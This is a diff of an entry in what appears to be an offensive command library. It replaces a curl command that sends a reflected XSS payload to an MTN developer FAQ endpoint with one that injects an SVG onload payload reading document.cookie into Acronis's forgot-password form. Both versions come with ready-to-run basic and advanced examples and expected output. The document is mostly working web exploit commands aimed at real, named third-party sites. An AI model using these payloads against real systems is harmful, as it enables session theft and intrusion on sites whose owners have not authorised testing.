@@ -1,13 +1,14 @@
 ---
-id: cmd-curl-post-xss
+id: curl-xss-post-2024
 data: >-
-  curl -X POST
-  https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php -H
-  "Content-Type: text/plain" --data-raw '{"helpful":"false&lt;svg
-  onload=alert(1)&gt;"}'
+  curl -X POST https://www.acronis.com/en-us/my/remind/index.html -d
+  "token=a016902ceaeb6ae91c21302631fbbcfc" -d
+  "SN=818198181891891981981981516518198198" -d "OrderId=" -d "Submit=Send
+  E-mail" -d "c=1\"<!--><Svg OnLoad=(confirm)(document.cookie)<!--"
 tags:
-  - web-exploit
-  - post-request
+  - xss
+  - web
+  - testing
 type: command
 output: null
 executor: bash
@@ -15,8 +16,8 @@ platforms:
   - Linux
   - macOS
   - Windows
-created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:47:12.988Z'
+created_at: '2024-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:27:43.080Z'
 verified: false
 validated: true
 submitted: true
@@ -26,41 +27,39 @@ submitted: true
 ## Command
 
 ```bash
-curl -X POST https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php -H "Content-Type: text/plain" --data-raw '{"helpful":"false&lt;svg onload=alert(1)&gt;"}'
+curl -X POST https://www.acronis.com/en-us/my/remind/index.html -d "token=a016902ceaeb6ae91c21302631fbbcfc" -d "SN=818198181891891981981981516518198198" -d "OrderId=" -d "Submit=Send E-mail" -d "c=1\"<!--><Svg OnLoad=(confirm)(document.cookie)<!--"
 ```
 
 ## Description
 
-This command sends a POST request with a raw text payload to exploit the reflected XSS in the FAQ form, bypassing JSON parsing by using text/plain content type.
+This command uses curl to send a POST request to the Acronis forgot password form, injecting an XSS payload into the 'c' parameter to test for reflection and execution. It simulates form submission with required fields and the malicious input.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-X POST` | Specifies the HTTP method | Yes |
-| `https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php` | Target endpoint URL | Yes |
-| `-H "Content-Type: text/plain"` | Sets header to send raw text | Yes |
-| `--data-raw` | Sends unencoded data body | Yes |
-| `'{"helpful":"false&lt;svg onload=alert(1)&gt;"}'` | Payload in JSON-like format | Yes |
+| `-X POST` | Specifies the HTTP method as POST | Yes |
+| `-d` | Data fields for form parameters (token, SN, etc.) | Yes |
+| `c=...` | The XSS payload parameter | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -X POST https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php -H "Content-Type: text/plain" --data-raw '{"helpful":"false&lt;svg onload=alert(1)&gt;"}'
+curl -X POST https://www.acronis.com/en-us/my/remind/index.html -d "c=<script>alert(1)</script>"
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -X POST https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php -H "Content-Type: text/plain" -v --data-raw '{"helpful":"false&lt;svg onload=alert(document.cookie)&gt;"}'
+curl -X POST https://www.acronis.com/en-us/my/remind/index.html -d "token=example" -d "c=1\"<!--><Svg OnLoad=(confirm)(document.cookie)<!--" -v
 ```
 
 ## Expected Output
 
-HTTP response (200 OK) with body reflecting the unsanitized input, e.g., containing the SVG tag in HTML, which executes when rendered.
+HTTP response body reflecting the payload if vulnerable; in browser context, JS execution like a confirm dialog with cookies. Use -v for verbose headers.
 
 ## Related
 
-- [[Related Procedure|procedures/Submit-Payload-via-POST-Request]]
+- [[Related Procedure: Test-Reflected-XSS-in-Forgot-Password-Form]]
